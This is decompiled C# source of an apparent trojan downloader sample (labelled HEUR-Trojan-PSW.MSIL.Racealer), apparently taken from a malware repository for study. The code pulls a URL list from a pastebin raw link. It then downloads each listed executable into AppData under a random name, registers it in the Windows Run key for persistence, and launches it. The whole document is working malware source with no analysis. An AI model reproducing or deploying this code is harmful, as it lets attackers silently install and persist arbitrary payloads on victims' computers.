// Decompiled with JetBrains decompiler
// Type: Pastebin_Payload.Program
// Assembly: Pastebin Payload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CB5271F2-AEA5-43F9-9CCD-5337AE458093
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-PSW.MSIL.Racealer.gen-0099e62ea3beb0f1631eb088bd697fd829963713ef4cb0e3a0a72b8c950c2383.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Threading;

namespace Pastebin_Payload
{
  internal class Program
  {
    private static string pastebin = "https://pastebin.com/raw/gCyjHCCH";
    private static Random random = new Random();

    private static void Main()
    {
      try
      {
        string s = new WebClient().DownloadString(Program.pastebin);
        List<string> stringList = new List<string>();
        using (StringReader stringReader = new StringReader(s))
        {
          string str;
          while ((str = stringReader.ReadLine()) != null)
            stringList.Add(str);
        }
        foreach (string str1 in stringList)
        {
          string line = str1;
          new Thread((ThreadStart) (() =>
          {
            try
            {
              string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.RandomString(24) + ".exe";
              System.IO.File.WriteAllBytes(str2, new WebClient().DownloadData(line));
              Program.RegisterInStartup(str2);
              Process.Start(str2);
            }
            catch
            {
            }
          })).Start();
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
        Program.Main();
      }
      Thread.Sleep(-1);
    }

    private static void RegisterInStartup(string file) => Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Program.RandomString(32), (object) file);

    private static string fnGetFriendlyName()
    {
      object obj = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().OfType<ManagementObject>().Select<ManagementObject, object>((Func<ManagementObject, object>) (x => x.GetPropertyValue("Caption"))).FirstOrDefault<object>();
      return obj == null ? "Unknown" : obj.ToString();
    }

    public static string RandomString(int length) => new string(Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", length).Select<string, char>((Func<string, char>) (s => s[Program.random.Next(s.Length)])).ToArray<char>());
  }
}
